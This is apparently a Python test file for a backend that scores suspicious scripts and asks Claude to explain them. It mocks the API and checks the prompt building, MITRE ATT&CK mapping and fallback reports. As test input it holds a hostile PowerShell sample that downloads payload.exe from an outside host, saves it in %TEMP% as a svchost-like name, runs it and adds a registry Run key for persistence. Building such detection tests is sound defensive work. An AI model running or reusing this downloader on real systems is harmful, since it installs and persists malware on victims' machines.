# backend/test_llm_pipeline.py
import sys, os, json
sys.path.insert(0, os.path.dirname(__file__))
from unittest.mock import patch, MagicMock

MOCK_JSON = json.dumps({
    "attack_chain": [
        "1단계: 인코딩된 PowerShell 명령이 실행되며 외부 서버로부터 페이로드를 다운로드합니다.",
        "2단계: 다운로드된 실행 파일이 %TEMP% 경로에 저장된 후 자동 실행됩니다.",
        "3단계: 레지스트리 Run 키에 등록되어 재부팅 후에도 지속성을 유지합니다.",
        "4단계: C2 서버와 지속적으로 통신하며 추가 명령을 수신할 수 있습니다.",
    ],
    "mitre_techniques": [
        {"technique_id": "T1059.001", "name": "PowerShell",         "tactic": "Execution"},
        {"technique_id": "T1105",     "name": "Ingress Tool Transfer","tactic": "Command and Control"},
        {"technique_id": "T1547.001", "name": "Registry Run Keys",   "tactic": "Persistence"},
        {"technique_id": "T1027.010", "name": "Command Obfuscation", "tactic": "Defense Evasion"},
    ],
    "recommendation": "해당 스크립트 실행을 즉시 차단하고 %TEMP%를 점검하세요.",
    "summary": "PowerShell 다운로더와 Command Obfuscation을 사용한 고위험 스크립트입니다.",
}, ensure_ascii=False)

SAMPLE_PS1 = b"""
$url = 'http://192.168.99.1/payload.exe'
$out = $env:TEMP + '\\svchost32.exe'
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $out)
$encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes($out))
Invoke-Expression $encoded
Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WinUpdate' -Value $out
"""

def mock_response(text):
    m = MagicMock()
    m.content = [MagicMock(text=text)]
    m.usage.input_tokens  = 380
    m.usage.output_tokens = 210
    return m

def section(t): print(f"\n{'─'*50}\n  {t}\n{'─'*50}")

def run():
    print("\n🔬 Claude API 통합 파이프라인 테스트 (mock)")

    section("1. 프롬프트 빌더")
    from llm_client.prompts import build_user_prompt, build_local_summary, SYSTEM_PROMPT
    from security.schemas import LocalModelOutput, RiskLevel
    dummy = LocalModelOutput(
        risk_score=0.72, risk_level=RiskLevel.HIGH,
        pattern_labels=["PowerShell 다운로더", "지속성 설치"],
        obfuscation_techniques=["Base64 인코딩"], obfuscation_score=0.55,
        entropy=5.61, evidence=["탐지 패턴: PowerShell 다운로더"], llm_required=True,
    )
    summary = build_local_summary(dummy)
    prompt  = build_user_prompt("$encoded = [Convert]::ToBase64...", summary)
    assert "위험도 점수" in summary and len(SYSTEM_PROMPT) > 100
    print(f"  시스템 프롬프트: {len(SYSTEM_PROMPT)}자 | 유저 프롬프트: {len(prompt)}자")
    print("  ✓ PASS")

    section("2. ATT&CK 매퍼")
    from security.schemas import MitreTechnique
    from security.attack_mapper import enrich_mitre_techniques
    raw = [
        MitreTechnique(technique_id="T1059.001", name="", tactic=""),
        MitreTechnique(technique_id="T1105", name="", tactic=""),
        MitreTechnique(technique_id="T1059.001", name="", tactic=""),  # 중복
    ]
    enriched = enrich_mitre_techniques(raw)
    assert len(enriched) == 2
    t = next(x for x in enriched if x.technique_id == "T1059.001")
    assert t.name == "PowerShell" and "attack.mitre.org" in t.url
    for x in enriched:
        print(f"  [{x.technique_id}] {x.name} — {x.tactic}")
    print("  ✓ PASS")

    section("3. Claude API mock 호출")
    with patch.dict(os.environ, {"ANTHROPIC_API_KEY": "test-key"}):
        with patch("anthropic.Anthropic") as MockA:
            MockA.return_value.messages.create.return_value = mock_response(MOCK_JSON)
            from llm_client.claude_client import call_claude
            report = call_claude("$wc.DownloadFile($url, $out)...", dummy)
    assert report.summary and len(report.attack_chain) >= 2
    print(f"  토큰: {report.token_usage} | 체인: {len(report.attack_chain)}단계 | ATT&CK: {len(report.mitre_techniques)}개")
    print("  ✓ PASS")

    section("4. E2E 파이프라인 (mock)")
    with patch.dict(os.environ, {"ANTHROPIC_API_KEY": "test-key"}):
        with patch("anthropic.Anthropic") as MockA:
            MockA.return_value.messages.create.return_value = mock_response(MOCK_JSON)
            from pipeline import run_pipeline
            result = run_pipeline("suspicious.ps1", SAMPLE_PS1)
    print(f"  파일: {result.filename} | 점수: {result.local.risk_score:.3f} → {result.local.risk_level.upper()}")
    token_msg = f"SKIP ✓" if result.llm_skipped else f"호출 ({result.llm.token_usage}토큰)"
    print(f"  Claude API: {token_msg} | {result.processing_time_ms}ms")
    print("  ✓ PASS")

    section("5. API 키 미설정 → 폴백")
    from llm_client.claude_client import _fallback_report
    fb = _fallback_report(dummy)
    assert fb.summary and len(fb.attack_chain) >= 2
    print(f"  폴백 요약: {fb.summary[:60]}...")
    print("  ✓ PASS")

    print(f"\n{'═'*50}\n  전체 5개 테스트 통과 ✓\n{'═'*50}\n")

if __name__ == "__main__":
    run()
